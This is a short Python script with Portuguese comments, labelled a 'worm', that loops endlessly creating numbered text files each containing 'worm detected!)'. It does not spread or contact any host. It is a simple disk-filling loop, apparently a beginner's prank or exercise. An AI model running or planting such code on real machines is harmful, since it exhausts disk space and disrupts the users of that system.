# cria uma função chamada worm
def worm():
	i = 0
	while True: # cria um arquivo infinitamente
	   with open(f"nome{i}.txt", 'w') as worm:
	   	worm.write("worm detected!)")
	   	i += 1		

# fecha a funcão worm			
worm()